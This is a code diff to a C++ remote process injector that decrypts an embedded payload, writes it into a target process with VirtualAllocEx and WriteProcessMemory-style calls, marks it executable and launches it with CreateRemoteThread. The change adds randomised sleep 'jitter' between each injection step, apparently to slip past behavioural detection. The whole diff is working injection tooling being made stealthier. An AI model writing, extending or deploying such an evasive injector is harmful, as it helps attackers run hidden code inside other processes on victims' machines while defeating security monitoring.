@@ -3,6 +3,7 @@
 
 #include "injector.hpp"
 #include "../crypto/crypto.hpp"
+#include "../core/jitter.hpp"
 #include "bootstrap_offset.hpp"
 #include <sstream>
 #include <fstream>
@@ -47,6 +48,8 @@ namespace Injector {
         LoadAndDecryptPayload();
         m_console.Debug("  [+] Payload decrypted (" + std::to_string(m_payload.size() / 1024) + " KB)");
 
+        Core::Jitter::SleepRange(10, 50);
+
         DWORD offset = Payload::BOOTSTRAP_OFFSET;
         if (offset == 0) {
             throw std::runtime_error("Could not find entry point in payload");
@@ -64,6 +67,8 @@ namespace Injector {
         SIZE_T payloadSize = m_payload.size();
         SIZE_T pipeNameSize = (pipeName.length() + 1) * sizeof(wchar_t);
         SIZE_T totalSize = payloadSize + pipeNameSize;
+
+        Core::Jitter::SleepRange(15, 60);
 
         m_console.Debug("Allocating memory in target process...");
         LPVOID remoteBase = api.pVirtualAllocEx(m_process.GetProcessHandle(), nullptr,
@@ -86,6 +91,8 @@ namespace Injector {
             throw std::runtime_error("Write params failed");
         m_console.Debug("  [+] Payload + parameters written");
 
+        Core::Jitter::SleepRange(10, 40);
+
         DWORD oldProtect = 0;
         if (!api.pVirtualProtectEx(m_process.GetProcessHandle(), remoteBase,
                                    totalSize, PAGE_EXECUTE_READ, &oldProtect))
@@ -93,6 +100,8 @@ namespace Injector {
         m_console.Debug("  [+] Memory protection set to PAGE_EXECUTE_READ");
 
         uintptr_t entry = reinterpret_cast<uintptr_t>(remoteBase) + offset;
+
+        Core::Jitter::SleepRange(20, 80);
 
         m_console.Debug("Creating remote thread...");
         HANDLE hThread = api.pCreateRemoteThread(m_process.GetProcessHandle(), nullptr, 0,
@@ -103,6 +112,8 @@ namespace Injector {
         ss << "  [+] Thread created (entry: 0x" << std::hex << entry << ")";
         m_console.Debug(ss.str());
         CloseHandle(hThread);
+
+        Core::Jitter::SleepRange(10, 50);
     }
 
     void PayloadInjector::LoadAndDecryptPayload() {
